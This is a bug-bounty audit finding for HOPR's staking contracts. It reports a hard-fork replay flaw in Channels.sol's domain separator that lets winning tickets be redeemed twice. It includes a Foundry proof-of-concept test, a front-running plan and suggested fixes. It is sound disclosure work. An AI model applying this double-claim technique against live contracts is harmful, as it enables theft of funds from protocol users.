# [H] Domain separators are susceptible to replay attacks, ticket rewards can be claimed twice

## Summary
Severity: High
Chain: Smart contract
Component: SafeStaking-by-HOPR
Published: 2023-10-06
Source: https://github.com/hats-finance/SafeStaking-by-HOPR-0x607386df18b663cf5ee9b879fbc1f32466ad5a85/issues/17
Type: hats-finding

## Details
**Github username:** @0xfuje
**Submission hash (on-chain):** 0xf9626ce34861c300afafbce036ca9d3a9b1860c8c651f8fbacec316607545b1a
**Severity:** high

**Description:**
## Impact
Winning tickets can be redeemed for rewards twice,  functions can use incorrect domain separator

## Description
In case of a hard fork a malicious node operator can claim his ticket rewards twice via `Channels.sol` - `redeemTicket()`. The root of the problem is that `updateDomainSeparator()` does not entirely prevent replay attacks when a hard fork happens because:
1. it's a public function, BUT none of the functions that use `domainSeparator` verify `block.chainid` it is up to date
2. it can be front-runned by the attacker on both chains to cause a replay attack
3. the attacker can simply redeem on both chains before anyone calls `updateDomainSeparator()` since none of the functions call it

`Channels.sol` - [`updateDomainSeparator()`](https://github.com/hats-finance/SafeStaking-by-HOPR-0x607386df18b663cf5ee9b879fbc1f32466ad5a85/blob/master/packages/ethereum/contracts/src/Channels.sol#L284-L300)
```solidity
    function updateDomainSeparator() public {
        // following encoding guidelines of EIP712
        bytes32 newDomainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("HoprChannels")),
                keccak256(bytes(VERSION)),
                block.chainid,
                address(this)
            )
        );

        if (newDomainSeparator != domainSeparator) {
            domainSeparator = newDomainSeparator;
            emit DomainSeparatorUpdated(domainSeparator);
        }
    }
```

A smart attacker can plan ahead on the news of a planned hard-fork and accumulate as much redeemable tickets as possible and setup a front-running bot to double claim his rewards before `updateDomainSeparator()` is called.

---

### Other vulnerable contracts
Rather then sending a different report, I decided to mention here that other contracts are vulnerable as well, however their impact is not as significant and can be classified at most medium or low severity

`Ledger.sol` - `updateLedgerDomainSeparator()`

While redeeming a ticket in `Channel.sol` - `redeemInternal()` will index events with the not yet up to date `ledgerDomainSeparator` -> `indexEvent()` will save a `snapshot` with the incorrect `latestRoot.rootHash` since it hashes `ledgerDomainSeparator`

`NodeSafeRegistry.sol` - `updateDomainSeparator()`

`registerSafeWithNodeSig()` - node can theoretically register a `safe` on both chains with the same signature

## Proof of Concept
1. navigate to `packages/ethereum/contracts/test/Channels.t.sol`
2. copy and paste the below proof of concept inside `HoprChannelsTest` contract
3. run `forge test --match-test testHardForkDoubleRedeem -vvvv`
```solidity
    function testHardForkDoubleRedeem(
        uint256 privKeyA,
        uint256 privKeyB,
        address safeContract,
        uint256 porSecret,
        uint96 channelAmount,
        uint96 amount,
        uint48 maxTicketIndex,
        uint32 indexOffset,
        uint24 epoch,
        uint48 channelTicketIndex
    )
        public
    { 
        /*///////////////////////////////////////////////////////////////
                                    SETUP START
        //////////////////////////////////////////////////////////////*/
        porSecret = bound(porSecret, 1, HoprCrypto.SECP256K1_FIELD_ORDER - 1);
        privKeyA = bound(privKeyA, 1, HoprCrypto.SECP256K1_FIELD_ORDER - 1);
        privKeyB = bound(privKeyB, 1, HoprCrypto.SECP256K1_FIELD_ORDER - 1);
        vm.assume(privKeyA != privKeyB);
        amount = uint96(bound(amount, MIN_USED_BALANCE, MAX_USED_BALANCE));
        channelAmount = uint96(bound(channelAmount, amount, MAX_USED_BALANCE));
        indexOffset = uint32(bound(indexOffset, 1, type(uint32).max));
        channelTicketIndex = uint48(bound(channelTicketIndex, 0, type(uint48).max - indexOffset - 1));
        maxTicketIndex = uint48(bound(maxTicketIndex, channelTicketIndex + 1, type(uint48).max - indexOffset));
        
        address src = vm.addr(privKeyA);
        address dest = vm.addr(privKeyB);
        
        vm.assume(safeContract != address(0) && safeContract != src && safeContract != dest);

        _helperNoSafeSetMock(dest);
        _helperTokenTransferMock(dest, amount);

        RedeemTicketArgBuilder memory args = RedeemTicketArgBuilder(
            privKeyA,
            privKeyB,
            hoprChannels.domainSeparator(),
            src,
            dest,
            amount,
            maxTicketIndex,
            indexOffset,
            epoch,
            HoprChannels.WinProb.unwrap(WIN_PROB_100),
            porSecret
        );

        hoprChannels._storeChannel(
            src, dest, channelAmount, channelTicketIndex, 0, epoch, HoprChannels.ChannelStatus.OPEN
        );

        (HoprChannels.RedeemableTicket memory redeemable, HoprCrypto.VRFParameters memory vrf) = CryptoUtils.getRedeemableTicket(args);
        /*///////////////////////////////////////////////////////////////
                            SETUP END / POC START
        //////////////////////////////////////////////////////////////*/

        // 1. hard fork happens
        uint256 hardForkTime = vm.snapshot();
        vm.warp(100);

        // 2. user claims winning ticket
        vm.prank(dest);
        hoprChannels.redeemTicket(redeemable, vrf);

        // 3. switch to fork chain
        vm.chainId(999);
        vm.revertTo(hardForkTime);

        // 4. user front-runs or just redeems ticket before updateDomainSeparator() is called
        vm.prank(dest);
        hoprChannels.redeemTicket(redeemable, vrf);

        // 5. update happens after the user redeemed his ticket
        hoprChannels.updateDomainSeparator();
    }
```


## Recommended Mitigation
### Double Ticket Claim
Consider making an `updateDomainSeparator()` call at the start of the `_redeemTicketInteran()` to prevent calling it with an outdated domain separator. 
```solidity
 function _redeemTicketInternal(
        address self,
        RedeemableTicket calldata redeemable,
        HoprCrypto.VRFParameters calldata params
    )
        internal
        validateBalance(redeemable.data.amount)
        HoprCrypto.isFieldElement(redeemable.porSecret)
    {
+    	updateDomainSeparator();    
```

An alternative solution that's more gas efficient, but adds a tiny bit of complexity is to only call  `updateDomainSeparator()` in the start of `_redeemTicketInternal()` if the `block.chainid` is different than the previous `chainid`. To archive this, `block.chainid` can be saved to a storage variable `chainId` in `updateDomainSeparator()`.

### Ledger, NodeSafeRegistry
Choose one method from the above solutions, implement the fix in functions that use the `domainSeparator`.
In `Ledger.sol` call `updateLedgerDomainSeparator()` at the start of `indexEvent()`. In `NodeSafeRegistry.sol` call `updateDomainSeparator()` at the start of `registerSafeWithNodeSig()`. Don't forget to do the same in `Channels.sol` - `_getTicketHash()` since it also uses `domainSeparator` to hash.
